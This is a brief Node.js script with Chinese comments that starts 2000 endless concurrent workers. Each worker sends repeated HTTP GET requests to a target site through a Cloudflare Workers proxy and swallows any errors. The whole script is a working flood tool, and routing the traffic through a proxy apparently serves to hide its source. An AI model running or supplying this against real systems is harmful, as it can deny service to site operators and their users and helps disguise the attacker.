const axios = require("axios");

const CONCURRENCY = 2000; // 并发数（比 100 worker 快）
const url = "https://proxy.347938669.workers.dev/api/fetch?url=https://load.vmheaven.io/";

async function worker(id) {
    while (true) {
        try {
            await axios.get(url, { timeout: 10000 });
        } catch (e) {
            // 忽略错误，避免 IO 阻塞
        }
    }
}

for (let i = 0; i < CONCURRENCY; i++) {
    worker(i + 1);
}
